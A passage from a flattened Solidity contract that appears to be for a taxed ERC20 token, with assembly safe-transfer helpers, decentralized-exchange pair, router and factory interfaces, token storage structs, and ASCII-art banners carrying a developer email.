951                     or(eq(mload(0x00), 1), iszero(returndatasize())),
952                     // We use 0x44 because that's the total length of our calldata (0x04 + 0x20 * 2)
953                     // Counterintuitively, this call() must be positioned after the or() in the
954                     // surrounding and() because and() evaluates its arguments from right to left.
955                     call(gas(), token, 0, 0x1c, 0x44, 0x00, 0x20)
956                 )
957             ) {
958                 // Store the function selector of `ApproveFailed()`.
959                 mstore(0x00, 0x3e3f8f73)
960                 // Revert with (offset, size).
961                 revert(0x1c, 0x04)
962             }
963 
964             mstore(0x40, memPointer) // Restore the memPointer.
965         }
966     }
967 
968     /// @dev Sends `amount` of ERC20 `token` from the current contract to `to`.
969     /// Reverts upon failure.
970     function safeTransfer(address token, address to, uint256 amount) internal {
971         /// @solidity memory-safe-assembly
972         assembly {
973             // We'll write our calldata to this slot below, but restore it later.
974             let memPointer := mload(0x40)
975 
976             // Write the abi-encoded calldata into memory, beginning with the function selector.
977             mstore(0x00, 0xa9059cbb)
978             mstore(0x20, to) // Append the "to" argument.
979             mstore(0x40, amount) // Append the "amount" argument.
980 
981             if iszero(
982                 and(
983                     // Set success to whether the call reverted, if not we check it either
984                     // returned exactly 1 (can't just be non-zero data), or had no return data.
985                     or(eq(mload(0x00), 1), iszero(returndatasize())),
986                     // We use 0x44 because that's the total length of our calldata (0x04 + 0x20 * 2)
987                     // Counterintuitively, this call() must be positioned after the or() in the
988                     // surrounding and() because and() evaluates its arguments from right to left.
989                     call(gas(), token, 0, 0x1c, 0x44, 0x00, 0x20)
990                 )
991             ) {
992                 // Store the function selector of `TransferFailed()`.
993                 mstore(0x00, 0x90b8ec18)
994                 // Revert with (offset, size).
995                 revert(0x1c, 0x04)
996             }
997 
998             mstore(0x40, memPointer) // Restore the memPointer.
999         }
1000     }
1001 
1002     function safeBurn(address token, uint256 amount) internal {
1003         /// @solidity memory-safe-assembly
1004         assembly {
1005             // We'll write our calldata to this slot below, but restore it later.
1006             let memPointer := mload(0x40)
1007 
1008             // Write the abi-encoded calldata into memory, beginning with the function selector.
1009             mstore(0x00, 0x42966c68)
1010             mstore(0x20, amount) // Append the "amount" argument.
1011 
1012             if iszero(
1013                 and(
1014                     // Set success to whether the call reverted, if not we check it either
1015                     // returned exactly 1 (can't just be non-zero data), or had no return data.
1016                     or(eq(mload(0x00), 1), iszero(returndatasize())),
1017                     // We use 0x44 because that's the total length of our calldata (0x04 + 0x20 * 1)
1018                     // Counterintuitively, this call() must be positioned after the or() in the
1019                     // surrounding and() because and() evaluates its arguments from right to left.
1020                     call(gas(), token, 0, 0x1c, 0x24, 0x00, 0x20)
1021                 )
1022             ) {
1023                 // Store the function selector of `BurnFailed()`.
1024                 mstore(0x00, 0x6f16aafc)
1025                 // Revert with (offset, size).
1026                 revert(0x1c, 0x04)
1027             }
1028 
1029             mstore(0x40, memPointer) // Restore the memPointer.
1030         }
1031     }    
1032 
1033     /// @dev Sends `amount` of ERC20 `token` from `from` to `to`.
1034     /// Reverts upon failure.
1035     ///
1036     /// The `from` account must have at least `amount` approved for
1037     /// the current contract to manage.
1038     function safeTransferFrom(address token, address from, address to, uint256 amount) internal {
1039         /// @solidity memory-safe-assembly
1040         assembly {
1041             // We'll write our calldata to this slot below, but restore it later.
1042             let memPointer := mload(0x40)
1043 
1044             // Write the abi-encoded calldata into memory, beginning with the function selector.
1045             mstore(0x00, 0x23b872dd)
1046             mstore(0x20, from) // Append the "from" argument.
1047             mstore(0x40, to) // Append the "to" argument.
1048             mstore(0x60, amount) // Append the "amount" argument.
1049 
1050             if iszero(
1051                 and(
1052                     // Set success to whether the call reverted, if not we check it either
1053                     // returned exactly 1 (can't just be non-zero data), or had no return data.
1054                     or(eq(mload(0x00), 1), iszero(returndatasize())),
1055                     // We use 0x64 because that's the total length of our calldata (0x04 + 0x20 * 3)
1056                     // Counterintuitively, this call() must be positioned after the or() in the
1057                     // surrounding and() because and() evaluates its arguments from right to left.
1058                     call(gas(), token, 0, 0x1c, 0x64, 0x00, 0x20)
1059                 )
1060             ) {
1061                 // Store the function selector of `TransferFromFailed()`.
1062                 mstore(0x00, 0x7939f424)
1063                 // Revert with (offset, size).
1064                 revert(0x1c, 0x04)
1065             }
1066 
1067             mstore(0x60, 0) // Restore the zero slot to zero.
1068             mstore(0x40, memPointer) // Restore the memPointer.
1069         }
1070     }
1071 
1072 }
1073 // File: contracts/swap/IPair.sol
1074 
1075 
1076 
1077 pragma solidity ^0.8.8;
1078 
1079 interface IPair {
1080     event Approval(address indexed owner, address indexed spender, uint value);
1081     event Transfer(address indexed from, address indexed to, uint value);
1082 
1083     function name() external pure returns (string memory);
1084     function symbol() external pure returns (string memory);
1085     function decimals() external pure returns (uint8);
1086     function totalSupply() external view returns (uint);
1087     function balanceOf(address owner) external view returns (uint);
1088     function allowance(address owner, address spender) external view returns (uint);
1089 
1090     function approve(address spender, uint value) external returns (bool);
1091     function transfer(address to, uint value) external returns (bool);
1092     function transferFrom(address from, address to, uint value) external returns (bool);
1093 
1094     function DOMAIN_SEPARATOR() external view returns (bytes32);
1095     function PERMIT_TYPEHASH() external pure returns (bytes32);
1096     function nonces(address owner) external view returns (uint);
1097 
1098     function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
1099 
1100     event Mint(address indexed sender, uint amount0, uint amount1);
1101     event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
1102     event Swap(
1103         address indexed sender,
1104         uint amount0In,
1105         uint amount1In,
1106         uint amount0Out,
1107         uint amount1Out,
1108         address indexed to
1109     );
1110     event Sync(uint112 reserve0, uint112 reserve1);
1111 
1112     function MINIMUM_LIQUIDITY() external pure returns (uint);
1113     function factory() external view returns (address);
1114     function token0() external view returns (address);
1115     function token1() external view returns (address);
1116     function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
1117     function price0CumulativeLast() external view returns (uint);
1118     function price1CumulativeLast() external view returns (uint);
1119     function kLast() external view returns (uint);
1120 
1121     function mint(address to) external returns (uint liquidity);
1122     function burn(address to) external returns (uint amount0, uint amount1);
1123     function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
1124     function skim(address to) external;
1125     function sync() external;
1126 
1127     function initialize(address, address) external;
1128 }
1129 // File: contracts/swap/ISwapRouter.sol
1130 
1131 
1132 
1133 pragma solidity ^0.8.8;
1134 
1135 interface ISwapRouter {
1136     function factory() external pure returns (address);
1137     function WETH() external pure returns (address);
1138 
1139     function addLiquidity(
1140         address tokenA,
1141         address tokenB,
1142         uint amountADesired,
1143         uint amountBDesired,
1144         uint amountAMin,
1145         uint amountBMin,
1146         address to,
1147         uint deadline
1148     ) external returns (uint amountA, uint amountB, uint liquidity);
1149     function addLiquidityETH(
1150         address token,
1151         uint amountTokenDesired,
1152         uint amountTokenMin,
1153         uint amountETHMin,
1154         address to,
1155         uint deadline
1156     ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
1157     function removeLiquidity(
1158         address tokenA,
1159         address tokenB,
1160         uint liquidity,
1161         uint amountAMin,
1162         uint amountBMin,
1163         address to,
1164         uint deadline
1165     ) external returns (uint amountA, uint amountB);
1166     function removeLiquidityETH(
1167         address token,
1168         uint liquidity,
1169         uint amountTokenMin,
1170         uint amountETHMin,
1171         address to,
1172         uint deadline
1173     ) external returns (uint amountToken, uint amountETH);
1174     function removeLiquidityWithPermit(
1175         address tokenA,
1176         address tokenB,
1177         uint liquidity,
1178         uint amountAMin,
1179         uint amountBMin,
1180         address to,
1181         uint deadline,
1182         bool approveMax, uint8 v, bytes32 r, bytes32 s
1183     ) external returns (uint amountA, uint amountB);
1184     function removeLiquidityETHWithPermit(
1185         address token,
1186         uint liquidity,
1187         uint amountTokenMin,
1188         uint amountETHMin,
1189         address to,
1190         uint deadline,
1191         bool approveMax, uint8 v, bytes32 r, bytes32 s
1192     ) external returns (uint amountToken, uint amountETH);
1193     function swapExactTokensForTokens(
1194         uint amountIn,
1195         uint amountOutMin,
1196         address[] calldata path,
1197         address to,
1198         uint deadline
1199     ) external returns (uint[] memory amounts);
1200     function swapTokensForExactTokens(
1201         uint amountOut,
1202         uint amountInMax,
1203         address[] calldata path,
1204         address to,
1205         uint deadline
1206     ) external returns (uint[] memory amounts);
1207     function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
1208         external
1209         payable
1210         returns (uint[] memory amounts);
1211     function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
1212         external
1213         returns (uint[] memory amounts);
1214     function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
1215         external
1216         returns (uint[] memory amounts);
1217     function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
1218         external
1219         payable
1220         returns (uint[] memory amounts);
1221 
1222     function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
1223     function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
1224     function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
1225     function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
1226     function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
1227 }
1228 
1229 interface ISwapRouterV2 is ISwapRouter {
1230     
1231     function factoryV2() external pure returns (address);
1232 
1233     function removeLiquidityETHSupportingFeeOnTransferTokens(
1234         address token,
1235         uint liquidity,
1236         uint amountTokenMin,
1237         uint amountETHMin,
1238         address to,
1239         uint deadline
1240     ) external returns (uint amountETH);
1241     function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
1242         address token,
1243         uint liquidity,
1244         uint amountTokenMin,
1245         uint amountETHMin,
1246         address to,
1247         uint deadline,
1248         bool approveMax, uint8 v, bytes32 r, bytes32 s
1249     ) external returns (uint amountETH);
1250 
1251     function swapExactTokensForTokensSupportingFeeOnTransferTokens(
1252         uint amountIn,
1253         uint amountOutMin,
1254         address[] calldata path,
1255         address to,
1256         uint deadline
1257     ) external;
1258     function swapExactETHForTokensSupportingFeeOnTransferTokens(
1259         uint amountOutMin,
1260         address[] calldata path,
1261         address to,
1262         uint deadline
1263     ) external payable;
1264     function swapExactTokensForETHSupportingFeeOnTransferTokens(
1265         uint amountIn,
1266         uint amountOutMin,
1267         address[] calldata path,
1268         address to,
1269         uint deadline
1270     ) external;
1271 
1272 }
1273 // File: contracts/swap/ISwapFactory.sol
1274 
1275 
1276 
1277 pragma solidity ^0.8.8;
1278 
1279 interface ISwapFactory {
1280     event PairCreated(address indexed token0, address indexed token1, address pair, uint);
1281     function feeTo() external view returns (address);
1282     function feeToSetter() external view returns (address);
1283     function getPair(address tokenA, address tokenB) external view returns (address pair);
1284     function allPairs(uint) external view returns (address pair);
1285     function allPairsLength() external view returns (uint);
1286     function createPair(address tokenA, address tokenB) external returns (address pair);
1287     function setFeeTo(address) external;
1288     function setFeeToSetter(address) external;
1289 }
1290 // File: contracts/storage/Tables.sol
1291 
1292 
1293 /*
1294 0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x
1295 0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x
1296 0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x
1297 0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x
1298 0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x
1299 0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x
1300 0000000000000000000OOkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOO000000000000000000x
1301 00000000000000koc;,......................................................................................,;cok00000000000000x
1302 00000000000xl,.                                                                                              .,lxO0000000000x
1303 000000000x:.                                                                                                    .;d000000000x
1304 0000000kc.                                                                                                        .ck0000000x
1305 000000x,                                                                                                            'x000000x
1306 00000x,                                                                                                              'x00000x
1307 0000O:                                                                                                                ;O0000x
1308 0000d.                                                                                                                .d0000x
1309 0000l                                ,,                ,,                       .loool,                                l0000x
1310 0000l                               ;xk:.             :kk:                     'dOkkkkx:                               c0000x
1311 0000l                             .:kOkkc.          .ckOkkc.                  ,xOkkkkkOkc.                             c0000x
1312 0000l                            .lkOkkkko.        .lkkkkkkl.                ;xkkkkkkOkkkl.                            c0000x
1313 0000l                           .okkkOkkOx'       .okkkOOkOd'                ....;dOkOOkkko.                           c0000x
1314 0000l                          'dkkkkkkOd'       'dOkkkkkOd'                      'dOkkkkkOd'                          c0000x
1315 0000l                         ,dOkkkkkko.       ,xOkkkkkko.                        .okOkOkkOx,                         c0000x
1316 0000l                        ;xOkkOkkkl.       ;xOkkkkkkl.              .....       .lkkkOOkOx;                        c0000x
1317 0000l                       :kOkkkkkkc.      .:kOkkkkOkc.              ,dxxxxc.      .ckOkkkkOk:.                      c0000x
1318 0000l                     .ckOkkkkkk:       .ckkkOkkOx;               ;xkkkkkkl.       :xOkkOkOkl.                     c0000x
1319 0000l                    .lkOkkOkOx;       .okkkkkkOx,              .:kOkkkkkkko.       ;xOkkOkkko.                    c0000x
1320 0000l                   .oOkkOkkOd,       .okkkkkkkd'              .ckOkkkkkOkkOd'       'dOkkOkkOd'                   c0000x
1321 0000l                  'dOkkkOkko.       ,dOkkOkkko.              .lkOkkkkkkkkkkOx,       .okkkkOkkd,                  c0000x
1322 0000l                 ,xOkkkkOko.       ;xOkkkkkkl.              .okkkkkkkkkkkkkkOx;       .lkkkOkkOx;                 c0000x
1323 0000l                ;xOkkOkkkl.       :kOkkOkkkc.              'dOkkkkkOo,ckOkkOkOkc.      .ckkkkkkOk:                c0000x
1324 0000l              .ckOkkkkOk:.      .ckOkkkkOx:              .,xkkOkOOko.  :xOkOkkOkl.       :kkkkkkkkc.              c0000x
1325 0000l             .lkOkkOOOx;       .lkkkkkkOx;              :dxOkkkkOkc.    ,xOkOkkkko.       ;xOkkkkOkl.             c0000x
1326 0000l            .okkkOkkOx,       .okkkkkkOd'             .ckOkkkkkOkc.      'dOkkkkkOd.       ,dkkkkkkko.            c0000x
1327 0000l           'dOkkOOkOd'       'dOkkOkkOo.             .lkOkkkkkOx;         .okOkkOkOd,       .dOkkkkkOd'           c0000x
1328 0000l          ,dOkOOkkko.       ,xOkkkkOkl.             .okkkOOkkOx,           .lkkkkkkOx;       .okkkkkkOx,          c0000x
1329 0000l         .oOkkOkkOx,       .dOkkkkkOx'             'dOkOkkkkOd'             'xOkOkkkOd.       'xOkOkkkOd.         c0000x
1330 0000l          'dOkkkkkko.       ,xOkkkkkko.           ,xOkkkkkkko.             .okkkkOkOx,       .oOkkkkkOd,          c0000x
1331 0000l           .okOkkkkOd'       'dOkkkOkkd'         ;xOkOOkkOkl.             .oOkkkkOkd'       'dOkkOkkkd'           c0000x
1332 0000l            .lkkkkOkOx,       .okkkkkkOd,      .:kkkkkkOkxc.             ,dOkkkkkko.       ,xOkkkkkko.            c0000x
1333 0000l             .ckOkkOkkx:       .lkOkkkkOx;    .lkOkkkkOx:.              ;xOkkkkOkl.       ;xOkkkOOkl.             c0000x
1334 0000l              .:kOkkkkOkc.      .ckkkkkkkk:. .okkkkkkOx,               :kOkkkkOkc.      .ckOkkkkOkc.              c0000x
1335 0000l                ;xOkkkkOkl.       :kOkkOkOkc;oOOkkkkOd'              .ckkkkkkkk:       .lkkkkkkOx;                c0000x
1336 0000l                 ,xkkOkkOko.       ,xOkkOOkkkkkkOkkko.              .lkkkkkkkx;       .okkkkkkOx,                 c0000x
1337 0000l                  'dOkkkOkkd'       'dOkkkkkkkkkkkkl.              .okkkOkkOd,       'dOkOOkkOd'                  c0000x
1338 0000l                   .okkkkkkOx,       .oOkkkkkkkkOkc.              'dOkOOkkOd'       ,dOkOkkkko.                   c0000x
1339 0000l                    .lkkkkkkOx;       .lkkkkOOkOk:               ,xOkkOkkko.       ;xOkkOkkkl.                    c0000x
1340 0000l                     .ckOkkkkOk:.      .ckkkkkOx;               :xOkkOkkkl.      .:kOkkkkkkc.                     c0000x
1341 0000l                       :xOkkkkOkl.      .:dxxxo,              .ckOkkkkOkc.      .ckkkkOkOk:                       c0000x
1342 0000l                        ,xOkkkkkko.       ....               .lkkkkkkOx;       .lkOkkkkOx;                        c0000x
1343 0000l                         'dOOkkkkOo.                        .okkkkkkOx,       .oOkkkkkOd,                         c0000x
1344 0000l                          .okkkkOkOd,                      'dOkkkkkOd'       'dOkkOOkkd'                          c0000x
1345 0000l                           .lkkkOkkOx:'...                .dOkkkkkko.       'xOkkkkOko.                           c0000x
1346 0000l                            .ckkkkkkkkkkx;                .ckOkkOkl.        .lkkkkOkl.                            c0000x
1347 0000l                             .:kkkkkOkOx,                  .:kkkkc.          .ckkkkc.                             c0000x
1348 0000l                               ;xOkkkOd'                     ;xk:.             :kx;                               c0000x
1349 0000l.                               'llllc.                       ',                ''                                l0000x
1350 0000d.                                                                                                                .d0000x
1351 0000O:                                                                                                                ;O0000x
1352 00000k,                                                                                                              'x00000x
1353 000000k,                                     hire.solidity.developer@gmail.com                                      ,x000000x
1354 0000000kc.                                                                                                        .ck0000000x
1355 000000000x:.                                                                                                    .:xO00000000x
1356 00000000000kl;.                                                                                              .;lk0O000000000x
1357 00000000000O00kdl:,'....................................................................................',:ldk00000000000000x
1358 0000000000000000000OOOkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOO0000000000000000000x
1359 0000000000000000000000000000000000000000O0000000OOO000000000000000000OO000O0000000000000000000000000000000000000000000000000x
1360 000000000000000000000000000000000000000000000kdddddk00000000000000OxddddxO00000000000000000000000000000000000000000000000000x
1361 00000000000000000000000000000000000000000000O:    .cO0000000000000o.    ,k00000000000000000000000000000000000000000000000000x
1362 0000000000000O0000O00000000000O00O0000000000O;     :O0000000O000O0o.    'x0000000000000000000000O000000000000O00000000000000x
1363 00000000000kxddddxxO00000000OkddddddddxO0000O;     :O0000Oxddddddx:     'x0O00OkxdddddddxO00000kdddddkO0000kxddddkO000000000x
1364 00000000Oo;..     ..;dO00Ox:..        ..;dO0O;     :O0Od;..             'x0Oxc'.        ..;oO00c.    ;O0000c.    ;O000000000x
1365 0000000k:     .:c:'  .o0Ol.     '::,.    .cOO;     :0Oc.    .,::cc,     'x0o.     '::;.     :O0:     ,O0000:     ,O000000000x
1366 0000000o.    .x000Oc..cOk'     cO000o.    .xO;     :0d.    .o00000o.    'kO,     :O000d.    .o0:     ,O0000:     ,O000000000x
1367 0000000o.     'lxO0OkkO0x.    .o0O00x.    .d0;     :0o.    'x0OOO0o.    .kk'     l0000k'    .l0:     ,O0000:     ,O000000000x
1368 0000000kc.      .'cdO0O0x.    .o0O00x.    .dO;     :0o.    'x0O0O0o.    .kk'     .;;;;,.    .l0:     ,O0000:     ,O000000000x
1369 00000000Oxl,.       .ck0x.    .o00O0x.    .d0;     :0o.    'x0OOO0o.    .kk'      ..........'d0:     ,O0000:     ;O000000000x
1370 000000000000ko:.      :0x.    .o00O0x.    .d0;     :0o.    'x00000o.    'kk'     ckkkkkkkkkkkO0:     ,O0000:     l0000000000x
1371 0000000d:,ck0O0k;     ,Ox.    .o0OO0d.    .d0;     :0o.    .x00000l     .kk'     c0000O00kc,:x0:     ,O0O0O:    ;k0000000000x
1372 00000O0d.  ,oddl.    .l0O:     .cddl'     ;OO;     :0k,     'loddc.     'x0c     .:oddddo;  ,k0:     'dddo:.  .ck00000000000x
1373 0000000Oo'          'oO00Ol.            .ck0O;     :O0k:.         .     'x0Oo'            .;x00:           .'cx0000000000000x
1374 000000000OdlcccccclxO000000Odlccccccccldk000Odcccccd0000kocccccccdxlccccoO0O0OdlcccccccccoxO000xcccccccccloxO000000000000000x
1375 000000000O000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x
1376 0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x
1377 0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x
1378 0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x
1379 0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x
1380 0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x
1381 OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO0d
1382 */
1383 
1384 pragma solidity ^0.8.19;
1385 
1386 
1387 
1388 
1389 struct TokenSetup {
1390     uint8 fairMode;
1391     uint24 gasLimit;
1392     uint16 buyTax;
1393     uint16 sellTax;
1394     uint16 transferTax;
1395     uint16 developmentShare;
1396     uint16 marketingShare;
1397     uint16 prizeShare;
1398     uint16 burnShare;
1399     uint16 autoLiquidityShare;
1400     uint16 swapThresholdRatio;
1401     address devWallet;
1402     address marketingWallet;
1403     address prizePool;
1404 }
1405 
1406 struct Registry {
1407     mapping(address => Account) Address;
1408     mapping(uint256 => address) PID;
1409     mapping(address => mapping(address => uint256)) allowances;
1410     mapping(address => bool) helpers;
1411 }
1412 
1413 struct Account {
1414     uint16 identifiers;
1415     uint64 nonces;
1416     uint80 PID;
1417     uint96 balance;
1418     address Address;
1419 }
1420 
1421 struct Settings {
1422     uint8 fairMode;
1423     uint16 buyTax;
1424     uint16 sellTax;
1425     uint16 transferTax;
1426     uint16 developmentShare;
1427     uint16 marketingShare;
1428     uint16 prizeShare;
1429     uint16 burnShare;
1430     uint16 autoLiquidityShare;
1431     uint16 swapThresholdRatio;
1432     uint24 gas;
1433     address[3] feeRecipients;
1434 }
1435 
1436 struct Storage {
1437     IPair PAIR;
1438     address owner;
1439     uint96 totalSupply;
1440     uint80 PID;
1441     bool launched;
1442     bool inSwap;
1443     Settings settings;
1444     Registry registry;
1445 }
1446 
1447 // File: contracts/storage/Token.sol
1448 
1449 
1450 /*
1451 0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x
1452 0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x
1453 0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x
1454 0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x
1455 0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x
1456 0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x
1457 0000000000000000000OOkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOO000000000000000000x
1458 00000000000000koc;,......................................................................................,;cok00000000000000x
1459 00000000000xl,.                                                                                              .,lxO0000000000x
1460 000000000x:.                                                                                                    .;d000000000x
1461 0000000kc.                                                                                                        .ck0000000x
1462 000000x,                                                                                                            'x000000x
1463 00000x,                                                                                                              'x00000x
1464 0000O:                                                                                                                ;O0000x
1465 0000d.                                                                                                                .d0000x
1466 0000l                                ,,                ,,                       .loool,                                l0000x
1467 0000l                               ;xk:.             :kk:                     'dOkkkkx:                               c0000x
1468 0000l                             .:kOkkc.          .ckOkkc.                  ,xOkkkkkOkc.                             c0000x
1469 0000l                            .lkOkkkko.        .lkkkkkkl.                ;xkkkkkkOkkkl.                            c0000x
1470 0000l                           .okkkOkkOx'       .okkkOOkOd'                ....;dOkOOkkko.                           c0000x
1471 0000l                          'dkkkkkkOd'       'dOkkkkkOd'                      'dOkkkkkOd'                          c0000x
1472 0000l                         ,dOkkkkkko.       ,xOkkkkkko.                        .okOkOkkOx,                         c0000x
1473 0000l                        ;xOkkOkkkl.       ;xOkkkkkkl.              .....       .lkkkOOkOx;                        c0000x
1474 0000l                       :kOkkkkkkc.      .:kOkkkkOkc.              ,dxxxxc.      .ckOkkkkOk:.                      c0000x
1475 0000l                     .ckOkkkkkk:       .ckkkOkkOx;               ;xkkkkkkl.       :xOkkOkOkl.                     c0000x
1476 0000l                    .lkOkkOkOx;       .okkkkkkOx,              .:kOkkkkkkko.       ;xOkkOkkko.                    c0000x
1477 0000l                   .oOkkOkkOd,       .okkkkkkkd'              .ckOkkkkkOkkOd'       'dOkkOkkOd'                   c0000x
1478 0000l                  'dOkkkOkko.       ,dOkkOkkko.              .lkOkkkkkkkkkkOx,       .okkkkOkkd,                  c0000x
1479 0000l                 ,xOkkkkOko.       ;xOkkkkkkl.              .okkkkkkkkkkkkkkOx;       .lkkkOkkOx;                 c0000x
1480 0000l                ;xOkkOkkkl.       :kOkkOkkkc.              'dOkkkkkOo,ckOkkOkOkc.      .ckkkkkkOk:                c0000x
1481 0000l              .ckOkkkkOk:.      .ckOkkkkOx:              .,xkkOkOOko.  :xOkOkkOkl.       :kkkkkkkkc.              c0000x
1482 0000l             .lkOkkOOOx;       .lkkkkkkOx;              :dxOkkkkOkc.    ,xOkOkkkko.       ;xOkkkkOkl.             c0000x
1483 0000l            .okkkOkkOx,       .okkkkkkOd'             .ckOkkkkkOkc.      'dOkkkkkOd.       ,dkkkkkkko.            c0000x
1484 0000l           'dOkkOOkOd'       'dOkkOkkOo.             .lkOkkkkkOx;         .okOkkOkOd,       .dOkkkkkOd'           c0000x
1485 0000l          ,dOkOOkkko.       ,xOkkkkOkl.             .okkkOOkkOx,           .lkkkkkkOx;       .okkkkkkOx,          c0000x
1486 0000l         .oOkkOkkOx,       .dOkkkkkOx'             'dOkOkkkkOd'             'xOkOkkkOd.       'xOkOkkkOd.         c0000x
1487 0000l          'dOkkkkkko.       ,xOkkkkkko.           ,xOkkkkkkko.             .okkkkOkOx,       .oOkkkkkOd,          c0000x
1488 0000l           .okOkkkkOd'       'dOkkkOkkd'         ;xOkOOkkOkl.             .oOkkkkOkd'       'dOkkOkkkd'           c0000x
1489 0000l            .lkkkkOkOx,       .okkkkkkOd,      .:kkkkkkOkxc.             ,dOkkkkkko.       ,xOkkkkkko.            c0000x
1490 0000l             .ckOkkOkkx:       .lkOkkkkOx;    .lkOkkkkOx:.              ;xOkkkkOkl.       ;xOkkkOOkl.             c0000x
1491 0000l              .:kOkkkkOkc.      .ckkkkkkkk:. .okkkkkkOx,               :kOkkkkOkc.      .ckOkkkkOkc.              c0000x
1492 0000l                ;xOkkkkOkl.       :kOkkOkOkc;oOOkkkkOd'              .ckkkkkkkk:       .lkkkkkkOx;                c0000x
1493 0000l                 ,xkkOkkOko.       ,xOkkOOkkkkkkOkkko.              .lkkkkkkkx;       .okkkkkkOx,                 c0000x
1494 0000l                  'dOkkkOkkd'       'dOkkkkkkkkkkkkl.              .okkkOkkOd,       'dOkOOkkOd'                  c0000x
1495 0000l                   .okkkkkkOx,       .oOkkkkkkkkOkc.              'dOkOOkkOd'       ,dOkOkkkko.                   c0000x
1496 0000l                    .lkkkkkkOx;       .lkkkkOOkOk:               ,xOkkOkkko.       ;xOkkOkkkl.                    c0000x
1497 0000l                     .ckOkkkkOk:.      .ckkkkkOx;               :xOkkOkkkl.      .:kOkkkkkkc.                     c0000x
1498 0000l                       :xOkkkkOkl.      .:dxxxo,              .ckOkkkkOkc.      .ckkkkOkOk:                       c0000x
1499 0000l                        ,xOkkkkkko.       ....               .lkkkkkkOx;       .lkOkkkkOx;                        c0000x
1500 0000l                         'dOOkkkkOo.                        .okkkkkkOx,       .oOkkkkkOd,                         c0000x
1501 0000l                          .okkkkOkOd,                      'dOkkkkkOd'       'dOkkOOkkd'                          c0000x
1502 0000l                           .lkkkOkkOx:'...                .dOkkkkkko.       'xOkkkkOko.                           c0000x
1503 0000l                            .ckkkkkkkkkkx;                .ckOkkOkl.        .lkkkkOkl.                            c0000x
1504 0000l                             .:kkkkkOkOx,                  .:kkkkc.          .ckkkkc.                             c0000x
1505 0000l                               ;xOkkkOd'                     ;xk:.             :kx;                               c0000x
1506 0000l.                               'llllc.                       ',                ''                                l0000x
1507 0000d.                                                                                                                .d0000x
1508 0000O:                                                                                                                ;O0000x
1509 00000k,                                                                                                              'x00000x
1510 000000k,                                     hire.solidity.developer@gmail.com                                      ,x000000x
1511 0000000kc.                                                                                                        .ck0000000x
1512 000000000x:.                                                                                                    .:xO00000000x
1513 00000000000kl;.                                                                                              .;lk0O000000000x
1514 00000000000O00kdl:,'....................................................................................',:ldk00000000000000x
1515 0000000000000000000OOOkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOO0000000000000000000x
1516 0000000000000000000000000000000000000000O0000000OOO000000000000000000OO000O0000000000000000000000000000000000000000000000000x
1517 000000000000000000000000000000000000000000000kdddddk00000000000000OxddddxO00000000000000000000000000000000000000000000000000x
1518 00000000000000000000000000000000000000000000O:    .cO0000000000000o.    ,k00000000000000000000000000000000000000000000000000x
1519 0000000000000O0000O00000000000O00O0000000000O;     :O0000000O000O0o.    'x0000000000000000000000O000000000000O00000000000000x
1520 00000000000kxddddxxO00000000OkddddddddxO0000O;     :O0000Oxddddddx:     'x0O00OkxdddddddxO00000kdddddkO0000kxddddkO000000000x
1521 00000000Oo;..     ..;dO00Ox:..        ..;dO0O;     :O0Od;..             'x0Oxc'.        ..;oO00c.    ;O0000c.    ;O000000000x
1522 0000000k:     .:c:'  .o0Ol.     '::,.    .cOO;     :0Oc.    .,::cc,     'x0o.     '::;.     :O0:     ,O0000:     ,O000000000x
